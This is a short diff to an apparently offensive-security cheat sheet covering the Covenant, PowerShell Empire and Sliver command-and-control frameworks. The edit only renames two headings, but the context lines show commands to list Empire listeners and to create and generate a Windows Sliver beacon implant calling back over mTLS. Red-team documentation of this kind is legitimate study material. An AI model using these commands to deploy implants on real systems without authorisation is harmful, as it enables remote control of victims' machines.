@@ -88,7 +88,7 @@ $ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name c
 
 > https://hackmag.com/security/powershell-empire/
 
-### Basic Commands
+### Common Commands
 
 ```c
 (Empire) > listeners                      // list current running listeners
@@ -339,7 +339,7 @@ sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format e
 sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
 ```
 
-### Basic Commands, Implant and Beacon Handling
+### Common Commands, Implant and Beacon Handling
 
 ```c
 sliver > mtls                                                             // Mutual Transport Layer Security
